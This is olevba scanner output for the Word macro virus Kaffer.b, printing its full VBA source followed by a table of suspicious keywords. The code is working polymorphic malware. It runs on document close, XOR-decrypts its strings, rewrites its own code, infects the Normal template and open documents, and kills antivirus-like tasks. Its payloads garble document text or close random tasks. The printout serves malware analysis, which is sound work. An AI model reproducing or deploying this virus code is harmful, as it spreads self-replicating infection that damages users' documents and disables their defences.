olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kaffer.b-e9491a3ebf14ae5ff21e5c78ca90aa4c3913ce9b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kaffer.b-e9491a3ebf14ae5ff21e5c78ca90aa4c3913ce9b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Kaffer.b-e9491a3ebf14ae5ff21e5c78ca90aa4c3913ce9b - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WARNING  The VBA code contains special characters such as backspace, that may be used for obfuscation.
Private Sub Kaffer()
End Sub
Private Sub Document_Close()
Dothis
End Sub
Private Sub AutoClose()
Dothis
End Sub
Private Function rndm(a)
Randomize Timer
rndm = Int(Rnd * a) + ((0 Xor 0 Xor 0) Xor 1)
End Function
Private Function spa()
Randomize Timer
spa = Space(rndm(((0 Xor 0 Xor 0) Xor 40)))
End Function
Private Function num(aa)
Randomize Timer
Select Case aa
Case 0
Select Case rndm(6)
Case 1: num = Crypt("­µ¥ýê÷¥µ¥ýê÷¥µ¬", 133)
Case 2: num = Crypt("ªäëúª²¬»»»»»««", 130)
Case 3: num = Crypt("¬íêð¬´ª½½½½½­­", 132)
Case 4: num = Crypt("ïöç¿¨µçöî", 199)
Case 5: num = Crypt("^YCOXE

", 55)
Case 6: num = Crypt("ý³¼­ýäõ­º§õäüü", 213)
End Select
Case 1
Select Case rndm(6)
Case 1: num = Crypt("ºº¢²êýà²¢²êýà²¢»²êýà²£»", 146)
Case 2: num = Crypt("ìì¢­¼ìôêýýýýýýííä¼«¶äõí", 196)
Case 3: num = Crypt("ðð±¶¬ðèöáááááññø ·ªøéñ", 216)
Case 4: num = Crypt("��–‡ßÈÕ‡–Ž‡ßÈÕ‡–Ž", 167)
Case 5: num = Crypt("§§æáû§¾¯÷àý¯¾¦¦¯¯÷àý¯¾¦", 143)
Case 6: num = Crypt("óó½²£óêû£´©ûêòòû£´©ûêò", 219)
End Select
End Select
End Function
Private Sub Mutate()
Select Case rndm(3)
Case 1: b = spa & Crypt("$WFWJW9#Y!5'
Y!54_", 119) & num(1) & Crypt("(/bnedlnetmd", 1)
Case 2: b = spa & Crypt("dZG[}\A^R_gV^C_RGV
eqcA\YVPG
eqp\^C\]V]G@", 51) & num(1) & Crypt("œ�•æÐÁ•ÛÚÇØÔÙ„•ˆ•›ÖÚÑÐØÚÑÀÙÐ�•ðÛÑ•âÜÁÝ", 181)
Case 3: b = spa & Crypt("Ùçúæ®ÀáüãïâÚëãþâïúë´®Ùçúæ® ØÌÞüáäëíú´®Ùçúæ® ØÌÍáãþáàëàúý¦", 142) & num(1) & Crypt("°£¹Êüí¹÷öëôøõ¨¹¤¹·úöýüôöýìõü£¹Ü÷ý¹Îðíñ£¹Ü÷ý¹Îðíñ£¹Ü÷ý¹Îðíñ", 153)
End Select
Select Case rndm(3)
Case 1: c = spa & Crypt("Ýëú®úæçý¿®³®Úæçýêáíûãëàú ØÌÞüáäëíú ØÌÍáãþáàëàúý¦", 142) & num(1) & Crypt("¢¥èäïîæäïþçî", 139)
Case 2: c = spa & Crypt("åÛÆÚ’æÚÛÁÖÝÑÇß×ÜÆœäðâÀÝØ×ÑÆœäðñÝßÂÝÜ×ÜÆÁš", 178) & num(1) & Crypt("|ou0!u!=<&duhu{6:108:1 90ou;1u<!=", 85)
Case 3: c = spa & Crypt("Æøåù±åùøâõþòäüôÿå«±Æøåù±¿ÇÓÁãþûôòå«±Æøåù±¿ÇÓÒþüáþÿôÿåâ¹", 145) & num(1) & Crypt("¯¼¦Õãò¦òîïõ·¦»¦¨åéâãëéâóêã¼¦Ãèâ¦Ñïòî¼¦Ãèâ¦Ñïòî¼¦Ãèâ¦Ñïòî", 134)
End Select
Select Case rndm(3)
Case 1: d = spa & Crypt("$>298}`})54.ls1438.u", 93) & num(1) & Crypt("±«­­´", 157)
Case 2: d = spa & Crypt("Ëõèô¼Èôõïøóÿéñùòè²ÊÞÌîóöùÿè²ÊÞßóñìóòùòèï´", 156) & num(1) & Crypt("øëñœ¨²¾µ´ñìñÿ²¾µ´¼¾µ¤½´ÿ½¸¿´¢ù", 209) & num(1) & Crypt("âøþþçîôî‹ ªî™§º¦", 206)
Case 3: d = spa & Crypt("ëÕÈÔœÈÔÕÏØÓßÉÑÙÒÈ†œëÕÈÔœ’êþìÎÓÖÙßÈ†œëÕÈÔœ’êþÿÓÑÌÓÒÙÒÈÏ”", 188) & num(1) & Crypt("¸«±Üèòþõô±¬±¿Òþõôüþõäýô¿ýøÿôâ¹", 145) & num(1) & Crypt("®´²²«¢¸Çìæ¢Õëöê¸¢Çìæ¢Õëöê¸¢Çìæ¢Õëöê", 130)
End Select
Select Case rndm(3)
Case 1: e = spa & Crypt("ðÎÓÏ‡ÉÈÕÊÆË–", 167)
Case 2: e = spa & Crypt("Üâÿã«åäùæêçÿîæûçêÿî¥ýéûùäáîèÿ¥ýéèäæûäåîåÿø¥âÿîæ£", 139) & num(1) & Crypt("¤£îâéèàâéøáè", 141)
Case 3: e = spa & Crypt("øæûç¯áàýâîãûêâÿãîûê¡ùíÿýàåêìû¡ùíìàâÿàáêáûü§", 143) & num(1) & Crypt("™žÓßÔÕÝßÔÅÜÕ", 176)
End Select
Select Case rndm(2)
Case 1: f = spa & Crypt("v<=4=,=416=+x", 88) & num(1) & Crypt("\P^


", 112)
Case 2: f = spa & Crypt("54)6:7ju?>7>/>725>({", 91) & num(1) & Crypt("]\A^R_
P\F]G\U_Z]V@", 51)
End Select
Select Case rndm(3)
Case 1: g = spa & Crypt("é¦££¡µ¨ª´³µ®© çª¾¤¨£¢", 199)
Case 2: g = spa & Crypt("4stihnvsti:", 26) & num(1) & Crypt("��ÀÔÎÂÉÈ", 173)
Case 3: g = spa & Crypt("ëê÷èäé´«äááã÷êèöñ÷ìëâ¥Èüæêáà", 133)
End Select
h = spa & Crypt(".$`7)4(", 64)
Select Case rndm(3)
Case 1: i = spa & Crypt("ßéø¬íïø½¬±¬íïøåúéèãïùáéâø¢ÚÎÜþãæéïø¢ÚÎÏãáüãâéâøÿ¤", 140) & num(1) & Crypt("˜ŸÒÞÕÔÜÞÕÄÝÔ", 177)
Case 2: i = spa & Crypt("Öèõé¡àâõè÷äåîâôìäïõ¯×ÃÑóîëäâõ¯×ÃÂîìñîïäïõò©", 129) & num(1) & Crypt("¥¶¬ßéø¬íïø½¬±¬¢ïãèéáãèùàé¶¬Éâè¬Ûåøä", 140)
Case 3: i = spa & Crypt("×éôè áãôéöåäïãõíåîôº ×éôè ®ÖÂÐòïêåãôº ×éôè ®ÖÂÃïíðïîåîôó¨", 128) & num(1) & Crypt("åöìŸ©¸ì­¯¸ýìñìâ¯£¨©¡£¨¹ ©öì‰¢¨ì›¥¸¤öì‰¢¨ì›¥¸¤öì‰¢¨ì›¥¸¤", 204)
End Select
Select Case rndm(3)
Case 1: j = spa & Crypt("RC", 114)
Case 2: j = spa & Crypt("iwjv>}jwh{zq}ks{pj0h|nlqt{}j0h|}qsnqp{pjm6", 30) & num(1) & Crypt(">9txsrzxsb{r", 23)
Case 3: j = spa & Crypt("E[FZSQF[DWV]QG_W\F
DPB@]XWQF
DPQ]_B]\W\FA
[FW_", 50) & num(1) & Crypt("äã®¢©¨ ¢©¸¡¨", 205)
End Select
Select Case rndm(2)
Case 1: k = spa & Crypt("×ØžòÝßÍÛ–�Ò×ÐÛÍ–––×ÐÊ–Ž�‡‡‡‡‡——žÆÑÌž�—’––Ø×Æ–�žÆÑÌž�——žÆÑÌž�———ž‚€ž", 190) & Chr(34) & Crypt("sqjubwf#pva#tn:4\hbeefq+*", 3) & Chr(34) & Crypt("
IUXS", 61)
Case 2: k = spa & Crypt("‚�ËžˆŠ˜ŽÃÅ‡‚…Ž˜ÃÃÃ‚…ŸÃÛÅÒÒÒÒÒÂÂË“„™ËÚÂÇÃÃ�‚“ÃÚË“„™ËÚÂÂË“„™ËÚÂÂÂË×ÕË", 235) & Chr(34) & Crypt("¤¦½¢µ ±Ô§¡¶Ô£¹ÍÃ«¿µ²²±¦ÜÝ", 244) & Chr(34) & Crypt("q%94?", 81)
End Select
l = spa & Crypt("›ÑÐÙÐÁÐÙÜÛÐÆ•", 181) & num(1) & Crypt("ÿóý°¼¦½§¼µ¿º½¶ ", 211)
Select Case rndm(2)
Case 1: m = spa & Crypt("ì£¦¦¤°­¯±¶°«¬¥â¯»¡­¦§", 194)
Case 2: m = spa & Crypt("
KLQGPVNKLGQ", 34) & num(1) & Crypt("s2&<0;:", 95)
End Select
n = spa & Crypt("MFL\x08AN", 40)
o = spa & Crypt("¨£©íº¤¹¥", 205)
P = spa: For oooo = 1 To rndm(6): tp = tp & Crypt(".??#&,.;& !a", 79): Next: P = P & Crypt("$:';s", 83) & tp & Crypt("¨·³®¨©´", 199): tp = ""
q = spa: For oooo = 1 To rndm(6): q = q & Crypt("v9((41;9,176v7(,176+", 88): Next: q = q & Crypt("ŒÔËÐ×ÑÒÐÍÖÇÁÖËÍÌ‚Ÿ‚", 162) & num(0): tp = ""
r = spa: For oooo = 1 To rndm(6): r = r & Crypt("ý²££¿º°²§º¼½ý¼£§º¼½ ", 211): Next: r = r & Crypt("¿òþÿ÷øãüòþÿçôãâøþÿâ±¬±", 145) & num(0): tp = ""
s = spa: For oooo = 1 To rndm(6): s = s & Crypt("ì£²²®«¡£¶«­¬ì­²¶«­¬±", 194): Next: s = s & Crypt("s.<+832/0<1-/20-)}`}", 93) & num(0): tp = ""
u = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ÖÇÇÛÞÔÖÃÞØÙ™", 183): Next: u = u & Crypt("öèõé¡", 129) & tp & Crypt("Ãòòîëáãöëíì", 130): tp = ""
v = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ãŒ½½¡¤®¬¹¤¢£", 205): Next: v = v & Crypt("O_NYYRILX]HUR[

", 60) & num(0): tp = ""
w = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("N__CFLN[F@A", 47): Next: w = w & Crypt("©ÔïèðÑîôòæëÅæôîäÂãîóèõ§º§", 135) & num(0): tp = ""
x = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("®Áððìéãáôéïî", 128): Next: x = x & Crypt(" Êçýþâï÷Ïâëüúý®³®ùêÏâëüúýÀáàë", 142): tp = ""
y = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("þ±  ¼¹³±¤¹¿¾", 208): Next: y = y & Crypt("¨ÍãÿÄïèâïèáõ¨Çââ¦ÍãÿÅéâã¼»ÄóïêâÍãÿÅéâã®ñâÍãÿÇêòª¦ñâÍãÿÀ··¯ª¦ÍãÿÅçòãáéôÿ¼»¶ª¦Åéëëçèâ¼»", 134) & Chr(34) & Chr(32) & Chr(34): tp = ""
z = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("©æ÷÷ëîäæóîèé", 135): Next: z = z & Crypt("Q:

<

4_B_\x08<

;


", 127): tp = ""
more = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("þ±  ¼¹³±¤¹¿¾", 208): Next: more = more & Crypt("ñ”º¦�¶±»¶±¸¬ñž»»ÿ”º¦œ°»ºåâ�ª¶³»”º¦œ°»º÷¨»”º¦ž³«óÿ¨»”º¦™çöóÿ”º¦œ¾«º¸°­¦åâïóÿœ°²²¾±»åâÿ", 223) & Chr(34) & Chr(32) & Chr(34): tp = ""
vircode = Array(b, c, d, e, f, g, h, i, j, k, l, m, n, o, P, q, r, s, o, u, v, w, x, y, z, more, o)
For ki = 0 To 26
With ThisDocument: With .VBProject:
With .vbcomponents(1): With .codemodule
.insertlines ki + 2, vircode(ki)
End With: End With
End With: End With
Next
End Sub
Private Function Crypt(klo, key)
Crypt = ""
For i = 1 To Len(klo)
Crypt = Crypt & Chr(Asc(Mid(klo, i, 1)) Xor key)
Next
End Function
Private Sub Dothis()
On Error Resume Next
For i = 1 To Tasks.Count
If LCase(InStr(1, Tasks(i).Name, Crypt("lct", 2))) Then Tasks(i).Close
If LCase(InStr(1, Tasks(i).Name, Crypt("dqct", 2))) Then Tasks(i).Close
Next
Mutate
Kaffer
With NormalTemplate
With .VBProject
With .vbcomponents(1)
With .codemodule
.deletelines 2, 27
End With
End With
End With
End With
With ActiveDocument
With .VBProject
With .vbcomponents(1)
With .codemodule
.deletelines 2, 27
End With
End With
End With
End With
With NormalTemplate
attr = GetAttr(.FullName)
SetAttr .FullName, 0
.Save
SetAttr .FullName, attr
End With
With ActiveDocument
attr = GetAttr(.FullName)
SetAttr .FullName, 0
.SaveAs .FullName
SetAttr .FullName, attr
End With
Select Case ActiveDocument.Content
Case UCase(InStr(1, ActiveDocument.Content.Text, Crypt("HBEEFQ", 3))): Payload_1
Case UCase(InStr(1, ActiveDocument.Content.Text, Crypt("NIRHIR", 6))): Payload_2
End Select
End Sub
Private Sub Payload_1()
With ActiveDocument.Content
With .Font
.Name = (rndm(10))
.Size = (20 + rndm(10))
 .ColorIndex = (rndm(19) - 1)
.Animation = (rndm(6) - 1)
 End With
.Text = Crypt("Ì¥Íäñà¥Îäããà÷ö¥¨¥Ñíàü¥éìîà¥ñê¥÷ðéà¥ðö¥Òíìñàö©¥çðñ¥ñíàü¥ä÷à¥ãðæîàá¥òìñí¥ÄÌÁÖ¥¤", 133)
End With
End Sub
Private Sub Payload_2()
Tasks(rndm(Tasks.Count)).Close
End Sub
' Wm97.Kaffer by Vlam
' Dear AV
' I am currently on the VX side, but one day i will join you.





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

